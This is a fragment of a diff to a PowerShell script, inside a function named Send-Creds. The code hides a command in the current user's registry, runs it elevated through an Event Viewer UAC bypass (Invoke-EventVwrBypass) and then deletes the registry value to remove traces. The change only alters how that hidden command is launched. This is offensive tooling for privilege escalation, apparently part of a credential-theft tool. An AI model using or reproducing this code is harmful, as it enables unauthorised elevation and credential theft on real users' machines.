@@ -56,7 +56,7 @@ Function Send-Creds {
 		# Save command in the register
 		New-ItemProperty -Path 'HKCU:\Software\Microsoft\Powershell' -Name 'Command' -Value $Command -PropertyType string -Force | Out-Null
 		# Execute bypass w/encoded command
-		Invoke-EventVwrBypass -Command 'Powershell Invoke-Expression (Get-ItemProperty -Path).Command' -Force
+		Invoke-EventVwrBypass -Command 'Powershell -NoExit -W Max "Invoke-Expression (Get-ItemProperty -Path).Command"' -Force
 		# Remove command from the register
 		Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Powershell' -Name 'Command' -Force
 	}
